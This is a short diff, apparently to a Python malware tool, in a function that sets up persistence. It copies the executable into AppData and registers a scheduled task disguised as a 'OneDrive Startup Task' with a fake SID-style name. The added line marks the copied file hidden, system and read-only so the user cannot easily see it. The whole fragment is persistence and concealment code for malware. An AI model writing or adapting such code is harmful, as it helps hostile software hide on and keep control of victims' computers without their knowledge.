@@ -421,6 +421,7 @@ def persist_schtasks():
         if exe_path != appdata_path:
             shutil.copy2(exe_path, appdata_path)
         exe_path = f'"{os.path.normpath(appdata_path)}"'
+        subprocess.run(f"attrib +h +s +r {exe_path}", shell=True)
         task_name = "OneDrive Startup Task-S-1-5-18-18081254745-36735435435255-3934re6s4246829952-16001"
         xml = rf"""
 <?xml version="1.0" encoding="UTF-16"?>
